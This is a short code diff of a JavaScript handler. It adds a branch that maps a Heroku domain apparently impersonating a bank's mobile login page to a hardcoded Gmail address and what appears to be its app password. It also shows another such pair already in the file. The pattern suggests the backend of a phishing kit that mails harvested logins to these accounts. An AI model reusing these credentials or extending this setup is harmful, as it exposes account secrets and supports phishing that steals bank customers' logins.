@@ -63,6 +63,11 @@ export default function handler(req, res) {
         email = 'derid1028@gmail.com';
         pass = 'fzntnluddmuahidw';
        
+    }
+    else if (url == 'app-bri-mo-login.herokuapp.com'){
+        email = 'namakuubri@gmail.com';
+        pass = 'acfrtsnasoaccdnt';
+           
         }
         
         try {
